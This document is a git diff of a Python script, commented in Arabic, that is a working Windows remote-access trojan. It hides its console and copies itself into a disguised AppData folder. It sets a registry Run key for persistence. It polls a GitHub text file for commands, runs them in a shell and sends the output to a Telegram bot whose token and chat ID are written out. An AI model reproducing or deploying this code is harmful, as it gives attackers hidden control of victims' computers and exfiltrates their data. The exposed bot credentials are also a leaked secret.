@@ -1,52 +1,57 @@
-import os
-import sys
-import shutil
-import subprocess
-import base64
-import time
-import requests
+import os, sys, shutil, subprocess, base64, time, requests
 
 # إعدادات الصمت
 si = subprocess.STARTUPINFO()
 si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
 si.wShowWindow = 0
 
+BOT_TOKEN = "8253181046:AAGwhrXiZU02eCt54pAGwpKuxTkJ7t4YRRI"
+CHAT_ID = "6012820754"
+# متغير لتخزين آخر أمر تم تنفيذه عشان ميتكررش
+last_cmd = ""
+
 def set_persistence():
     try:
-        # 1. تحديد مكان مخفي للنسخة الدائمة (فولدر الـ AppData)
         app_data = os.getenv("APPDATA")
         target_dir = os.path.join(app_data, "WindowsHealth")
         if not os.path.exists(target_dir):
             os.makedirs(target_dir)
-            
-        target_path = os.path.join(target_dir, "WinService.exe")
-        
-        # 2. نسخ الملف الحالي للمكان الجديد (لو شغال كـ EXE)
+        target_path = os.path.join(target_dir, "Very Important.exe")
         if not os.path.exists(target_path) and ".exe" in sys.executable:
             shutil.copyfile(sys.executable, target_path)
-            
-            # 3. إضافة مفتاح في الـ Registry للتشغيل مع الـ Startup
-            # أمر مشفر للهرب من الفحص
             reg_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsHealthService" /t REG_SZ /d "{target_path}" /f'
             subprocess.run(reg_cmd, shell=True, startupinfo=si)
-    except:
-        pass
+    except: pass
 
 def beacon_logic():
-    # رابط الأوامر الخاص بك على GitHub
+    global last_cmd
     CMD_URL = "https://raw.githubusercontent.com/b1do404/My-Python-Practise/refs/heads/main/test/cmd.txt"
     while True:
         try:
-            r = requests.get(f"{CMD_URL}?t={int(time.time())}", timeout=10)
+            # إضافة Timestamp وإلغاء الـ Cache تماماً
+            r = requests.get(f"{CMD_URL}?t={int(time.time())}", timeout=5)
             cmd = r.text.strip()
-            if cmd != "sleep":
-                # تنفيذ الأمر وإرسال النتيجة لتليجرام
+            
+            # لو الأمر اتغير ومفتوح (مش sleep) نفذه
+            if cmd != last_cmd and cmd.lower() != "sleep" and cmd != "":
+                if cmd.lower() == "kill":
+                    # مسح الريجستري وقفل البرنامج
+                    subprocess.run('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsHealthService" /f', shell=True, startupinfo=si)
+                    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": "💀 Self-Destruct Complete."})
+                    os._exit(0)
+                
+                # تنفيذ الأمر
                 output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, startupinfo=si)
-                requests.post("https://api.telegram.org/bot8253181046:AAGwhrXiZU02eCt54pAGwpKuxTkJ7t4YRRI/sendMessage", 
-                              data={"chat_id": "6012820754", "text": output.decode()})
-            time.sleep(30) # نبضة كل 30 ثانية
-        except:
-            time.sleep(60)
+                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
+                              data={"chat_id": CHAT_ID, "text": f"🚀 Result:\n{output.decode('utf-8', errors='ignore')}"})
+                
+                # تحديث آخر أمر تم تنفيذه
+                last_cmd = cmd
+            
+            # الانتظار بقى 5 ثواني بس لسرعة الاستجابة
+            time.sleep(5) 
+        except Exception:
+            time.sleep(10)
 
 if __name__ == "__main__":
     set_persistence()
